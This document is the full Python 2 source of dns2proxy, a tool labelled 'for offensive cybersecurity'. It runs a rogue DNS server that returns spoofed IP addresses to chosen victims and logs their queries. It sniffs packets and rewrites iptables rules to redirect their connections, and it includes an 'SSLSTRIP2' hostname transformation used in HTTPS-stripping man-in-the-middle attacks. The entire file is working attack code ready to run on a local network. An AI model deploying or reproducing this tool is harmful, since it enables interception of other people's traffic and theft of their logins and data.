#!/usr/bin/env python
'''
dns2proxy for offensive cybersecurity v1.0


python dns2proxy.py -h for Usage.

Example:
python2.6 dns2proxy.py -i eth0 -u 192.168.1.101 -d 192.168.1.200

Example for no forwarding (only configured domain based queries and spoofed hosts):
  python2.6 dns2proxy.py -i eth0 -noforward

Example for no forwarding but add IPs
  python dns2proxy.py -i eth0 -I 192.168.1.101,90.1.1.1,155.54.1.1 -noforward

Author: Leonardo Nve ( leonardo.nve@gmail.com)
'''


import dns.message
import dns.rrset
import dns.resolver
import socket
import numbers
import threading
from struct import *
import datetime
import pcapy
import os
import signal
import errno
from time import sleep,time
import argparse


consultas = {}
spoof = {}
dominios = {}
nospoof = []
nospoofto = []
victims = []

LOGREQFILE = "dnslog.txt"
LOGSNIFFFILE = "snifflog.txt"
LOGALERTFILE = "dnsalert.txt"
RESOLVCONF = "resolv.conf"

victim_file = "victims.cfg"
nospoof_file = "nospoof.cfg"
nospoofto_file = "nospoofto.cfg"
specific_file = "spoof.cfg"
dominios_file = "domains.cfg"

parser = argparse.ArgumentParser()
parser.add_argument("-N", "--noforward", help="DNS Fowarding OFF (default ON)", action="store_true")
parser.add_argument("-i", "--interface", help="Interface to use", default="eth0")
parser.add_argument("-u", "--ip1", help="First IP to add at the response", default=None)
parser.add_argument("-d", "--ip2", help="Second IP to add at the response", default=None)
parser.add_argument("-I", "--ips", help="List of IPs to add after ip1,ip2 separated with commas", default=None)
parser.add_argument("-S", "--silent", help="Silent mode", action="store_true")
parser.add_argument("-A", "--adminIP", help="Administrator IP for no filtering", default="192.168.0.1")

args = parser.parse_args()

debug = not args.silent
dev = args.interface
adminip = args.adminIP
ip1 = args.ip1
ip2 = args.ip2
Forward = not args.noforward

fake_ips = []
# List of of ips
if args.ips is not None:
    for ip in args.ips.split(","):
        fake_ips.append(ip)

Resolver = dns.resolver.Resolver()

######################
# GENERAL SECTION    #
######################


def save_req(lfile, str):
    f = open(lfile, "a")
    f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ' ' + str)
    f.close()


def SIGUSR1_handle(signalnum, frame):
    global noserv
    global Resolver
    noserv = 0
    DEBUGLOG('Reconfiguring....')
    process_files()
    Resolver.reset()
    Resolver.read_resolv_conf(RESOLVCONF)
    return


def process_files():
    global nospoof
    global spoof
    global nospoof_file
    global specific_file
    global dominios_file
    global dominios
    global nospoofto_file

    for i in nospoof[:]:
        nospoof.remove(i)

    for i in nospoofto[:]:
        nospoofto.remove(i)

    for i in victims[:]:
        victims.remove(i)

    dominios.clear()
    spoof.clear()

    nsfile = open(nospoof_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Non spoofing ' + h[0])
            nospoof.append(h[0])

    nsfile.close()

    nsfile = open(victim_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Spoofing only to ' + h[0])
            victims.append(h[0])

    nsfile.close()

    nsfile = open(nospoofto_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Non spoofing to ' + h[0])
            nospoofto.append(h[0])

    nsfile.close()

    nsfile = open(specific_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 1:
            DEBUGLOG('Specific host spoofing ' + h[0] + ' with ' + h[1])
            spoof[h[0]] = h[1]

    nsfile.close()
    nsfile = open(dominios_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 1:
            DEBUGLOG('Specific domain IP ' + h[0] + ' with ' + h[1])
            dominios[h[0]] = h[1]

    nsfile.close()
    return


def DEBUGLOG(str):
    global debug
    if debug:
        print str
    return


def handler_msg(id):
    os.popen('./handler_msg.sh %s >> handler_msg.log 2>> handler_msg_error.log &'%id.replace('`','_').replace(';','_').replace('|','_').replace('&','_'))
    return

######################
# SNIFFER SECTION    #
######################

class ThreadSniffer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        #DEBUGLOG( self.getName(), " Sniffer Waiting connections....")
        go()

def go():
    global ip1
    global dev
    bpffilter = "dst host %s and not src host %s and !(tcp dst port 80 or tcp dst port 443) and (not host %s)" % (
        ip1, ip1, adminip)
    cap = pcapy.open_live(dev, 255, 1, 0)
    cap.setfilter(bpffilter)
    DEBUGLOG( "Starting sniffing in (%s = %s)...." % (dev, ip1))

    #start sniffing packets
    while True:
        try:
            (header, packet) = cap.next()
            parse_packet(packet)
        except:
            pass
            #DEBUGLOG( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))

#function to parse a packet
def parse_packet(packet):
    eth_length = 14
    eth_protocol = 8
    global ip1
    global consultas
    global ip2

    #Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8:
        #Parse IP header
        #take first 20 characters for the ip header
        ip_header = packet[eth_length:20 + eth_length]

        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = iph[0]
        #version = version_ihl >> 4
        ihl = version_ihl & 0xF

        iph_length = ihl * 4

        #ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])



        #TCP protocol
        if protocol == 6:
            t = iph_length + eth_length
            tcp_header = packet[t:t + 20]

            #now unpack them :)
            tcph = unpack('!HHLLBBHHH', tcp_header)

            source_port = tcph[0]
            dest_port = tcph[1]
            #            sequence = tcph[2]
            #            acknowledgement = tcph[3]
            #            doff_reserved = tcph[4]
            #            tcph_length = doff_reserved >> 4



            if consultas.has_key(str(s_addr)):
                DEBUGLOG(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
                DEBUGLOG(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
                #            	print '>>>>  '+str(s_addr)+' esta en la lista!!!!.....'
                comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
                    ip2, str(dest_port), consultas[str(s_addr)], str(dest_port))
                os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
                #print '>>>> ' + comando
                comando = '/sbin/iptables -D INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                    ip1, str(dest_port), str(s_addr), str(source_port))
                os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
                comando = '/sbin/iptables -A INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                    ip1, str(dest_port), str(s_addr), str(source_port))
                os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
                #print '>>>> ' + comando

        #UDP packets
        elif protocol == 17:
            u = iph_length + eth_length
            #udph_length = 8
            #udp_header = packet[u:u + 8]
            #now unpack them :)
            #udph = unpack('!HHHH', udp_header)
            #source_port = udph[0]
            #dest_port = udph[1]
            #length = udph[2]
            #checksum = udph[3]
            #DEBUGLOG('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
            #h_size = eth_length + iph_length + udph_length
            #data_size = len(packet) - h_size
            #get data from the packet
            #data = packet[h_size:]


######################
#  DNS SECTION       #
######################

def respuestas(name, type):
    global Resolver

    DEBUGLOG('Query = ' + name + ' ' + type)
    try:
        answers = Resolver.query(name, type)
    except Exception, e:
        DEBUGLOG('Exception...')
        return 0
    return answers


def requestHandler(address, message):
    resp = None
    dosleep = False
    qtime = time()
    seconds_betwen_ids  = 30
    try:
        message_id = ord(message[0]) * 256 + ord(message[1])
        DEBUGLOG('msg id = ' + str(message_id))
        if message_id in serving_ids:
            if (qtime - serving_ids[message_id]) < seconds_betwen_ids:
                DEBUGLOG('I am already serving this request.')
                return
        serving_ids[message_id] = qtime
        DEBUGLOG('Client IP: ' + address[0])
        prov_ip = address[0]
        try:
            msg = dns.message.from_wire(message)
            try:
                op = msg.opcode()
                if op == 0:
                    # standard and inverse query
                    qs = msg.question
                    if len(qs) > 0:
                        q = qs[0]
                        DEBUGLOG('request is ' + str(q))
                        save_req(LOGREQFILE, 'Client IP: ' + address[0] + '    request is    ' + str(q) + '\n')
                        if q.rdtype == dns.rdatatype.A:
                            DEBUGLOG('Doing the A query....')
                            resp, dosleep = std_A_qry(msg, prov_ip)
                        elif q.rdtype == dns.rdatatype.PTR:
                            #DEBUGLOG('Doing the PTR query....')
                            resp = std_PTR_qry(msg)
                        elif q.rdtype == dns.rdatatype.MX:
                            DEBUGLOG('Doing the MX query....')
                            resp = std_MX_qry(msg)
                        elif q.rdtype == dns.rdatatype.TXT:
                            #DEBUGLOG('Doing the TXT query....')
                            resp = std_TXT_qry(msg)
                        elif q.rdtype == dns.rdatatype.AAAA:
                            #DEBUGLOG('Doing the AAAA query....')
                            resp = std_AAAA_qry(msg)
                        else:
                            # not implemented
                            resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
                else:
                    # not implemented
                    resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented

            except Exception, e:
                DEBUGLOG('got ' + repr(e))
                resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
                DEBUGLOG('resp = ' + repr(resp.to_wire()))
        except Exception, e:
            DEBUGLOG('got ' + repr(e))
            resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
            DEBUGLOG('resp = ' + repr(resp.to_wire()))
    except Exception, e:
        # message was crap, not even the ID
        DEBUGLOG('got ' + repr(e))

    if resp:
        s.sendto(resp.to_wire(), address)
    if dosleep: sleep(1)  # Performance downgrade no tested jet


def std_PTR_qry(msg):
    qs = msg.question
    DEBUGLOG( str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'PTR')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_MX_qry(msg):
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
    return resp
    #Temporal disable MX responses
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'MX')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_TXT_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    host = iparpa[:-1]
    punto = host.find(".")
    dominio = host[punto:]
    host = "."+host
    spfresponse = ''
    if (dominio in dominios) or (host in dominios):
        ttl = 1
        DEBUGLOG('Alert domain! (TXT) ID: ' + host)
        # Here the HANDLE!
        #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
        save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
        if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
        if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
        DEBUGLOG('Responding with SPF = ' + spfresponse)
        rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
        resp.answer.append(rrset)
        return resp


    hosts = respuestas(iparpa[:-1], 'TXT')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.TXT, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_SPF_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    # host = iparpa[:-1]
    # punto = host.find(".")
    # dominio = host[punto:]
    # host = "."+host
    # if (dominio in dominios) or (host in dominios):
    #     ttl = 1
    #     DEBUGLOG('Alert domain! (TXT) ID: ' + host)
    #     # Here the HANDLE!
    #     #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
    #     save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
    #     if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
    #     if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
    #     DEBUGLOG('Responding with SPF = ' + spfresponse)
    #     rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
    #     resp.answer.append(rrset)
    #     return resp


    hosts = respuestas(iparpa[:-1], 'SPF')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.SPF, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_AAAA_qry(msg):
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
    return resp

def std_A_qry(msg, prov_ip):
    global consultas
    global ip1
    global ip2
    global fake_ips

    dosleep = False
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    resp = make_response(qry=msg)
    for q in qs:
        qname = q.name.to_text()[:-1]
        DEBUGLOG('q name = ' + qname)

        host = qname.lower()

        # dom1 = None
        # dominio = None

        # punto1 = host.rfind(".")
        # punto2 = host.rfind(".",0,punto1-1)

        # if punto1 > -1:
        #     dom1 = host[punto1:]

        # if punto2 > -1:
        #     dominio = host[punto2:]


        find_host = None
        for d in dominios:
            if d in host:
                find_host = d

        if (find_host is not None):
            ttl = 1
            # id = host[:punto2]
            # if dom1 in dominios:
            #     id = host[:punto1]
            #     dominio = dom1

            DEBUGLOG('Alert domain! ID: ' + host)
            # Here the HANDLE!
            #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
            handler_msg(host)
            save_req(LOGALERTFILE, 'Alert domain! ID: ' + host + '\n')
            
            if host not in spoof:
                DEBUGLOG('Responding with IP = ' + dominios[find_host])
                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[find_host])
            else:
                DEBUGLOG('Responding with IP = ' + spoof[host])
                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, spoof[host])

            resp.answer.append(rrset)
            return resp, dosleep

        if ".%s"%host in dominios:
            dominio = ".%s"%host
            ttl = 1
            DEBUGLOG('Responding with IP = ' + dominios[dominio])
            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
            resp.answer.append(rrset)
            return resp, dosleep

        ips = respuestas(qname.lower(), 'A')
        if qname.lower() not in spoof and isinstance(ips, numbers.Integral):
        # SSLSTRIP2 transformation
            punto = host.find(".")
            dominio = host[punto:]
            host2 = ''
            if host[:5] == 'wwww.' or host[:7] == 'social.':
                host2 = 'www%s' % dominio
            elif host[:3] == 'web':
                host2 = host[3:]
            elif host[:7] == 'cuentas':
                host2 = 'accounts%s' % dominio
            elif host[:5] == 'gmail':
                host2 = 'mail%s' % dominio
            elif host == 'chatenabled.gmail.google.com':  # Yes, It is ugly....
                host2 = 'chatenabled.mail.google.com'
            if host2 != '':
                DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
                ips = respuestas(host2, 'A')

        #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)

        if isinstance(ips, numbers.Integral):
            DEBUGLOG('No host....')
            resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
            return resp, dosleep

        prov_resp = ips[0]
        consultas[prov_ip] = prov_resp

        ttl = 1
        if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims) == 0 or prov_ip in victims):
            if host in spoof:
                save_req(LOGREQFILE, '!!! Specific host (' + host + ') asked....\n')
                for spoof_ip in spoof[host].split(","):
                    DEBUGLOG('Adding fake IP = ' + spoof_ip)
                    rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip)
                    resp.answer.append(rrset)
                return resp, dosleep
            elif Forward:
                consultas[prov_ip] = prov_resp
                #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                if ip1 is not None:
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip1)
                    DEBUGLOG('Adding fake IP = ' + ip1)
                    resp.answer.append(rrset)
                if ip2 is not None:
                    #Sleep only when using global resquest matrix
                    dosleep = True
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip2)
                    DEBUGLOG('Adding fake IP = ' + ip2)
                    resp.answer.append(rrset)
                if len(fake_ips)>0:
                    for fip in fake_ips:
                        rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
                        DEBUGLOG('Adding fake IP = ' + fip)
                        resp.answer.append(rrset)

        if not Forward and prov_ip not in nospoofto:
            if len(fake_ips) == 0:
                DEBUGLOG('No forwarding....')
                resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
            elif len(fake_ips) > 0:
                DEBUGLOG('No forwarding (but adding fake IPs)...')
                for fip in fake_ips:
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
                    DEBUGLOG('Adding fake IP = ' + fip)
                    resp.answer.append(rrset)
            return resp, dosleep

        for realip in ips:
            DEBUGLOG('Adding real IP  = ' + realip.to_text())
            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
            resp.answer.append(rrset)

    return resp, dosleep


# def std_A2_qry(msg):
# 	qs = msg.question
# 	DEBUGLOG(str(len(qs)) + ' questions.')
# 	iparpa = qs[0].to_text().split(' ',1)[0]
# 	print 'Host: '+ iparpa
# 	resp = make_response(qry=msg)
# 	rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.A, '4.4.45.4')
# 	resp.answer.append(rrset)
# 	return resp

def std_ASPOOF_qry(msg):
    global spoof
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg)

    for q in qs:
        qname = q.name.to_text()[:-1]
        DEBUGLOG('q name = ' + qname) + ' to resolve ' + spoof[qname]
        # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.tuenti.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.twitter.com.')
        # 		resp.answer.append(rrset)
        rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[qname])
        resp.answer.append(rrset)
        return resp


def make_response(qry=None, id=None, RCODE=0):
    if qry is None and id is None:
        raise Exception, 'bad use of make_response'
    if qry is None:
        resp = dns.message.Message(id)
        # QR = 1
        resp.flags |= dns.flags.QR
        if RCODE != 1:
            raise Exception, 'bad use of make_response'
    else:
        resp = dns.message.make_response(qry)
    resp.flags |= dns.flags.AA
    resp.flags |= dns.flags.RA
    resp.set_rcode(RCODE)
    return resp


process_files()
Resolver.reset()
Resolver.read_resolv_conf(RESOLVCONF)
signal.signal(signal.SIGUSR1, SIGUSR1_handle)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 53))
if Forward:
    DEBUGLOG('DNS Forwarding activado....')
else:
    DEBUGLOG('DNS Forwarding desactivado....')

DEBUGLOG('binded to UDP port 53.')
serving_ids = {}
noserv = True

if ip1 is not None and ip2 is not None and Forward:
    sniff = ThreadSniffer()
    sniff.start()

while True:
    if noserv:
        DEBUGLOG('waiting requests.')

    try:
        message, address = s.recvfrom(1024)
        noserv = True
    except socket.error as (code, msg):
        if code != errno.EINTR:
            raise

    if noserv:
        DEBUGLOG('serving a request.')
        requestHandler(address, message)
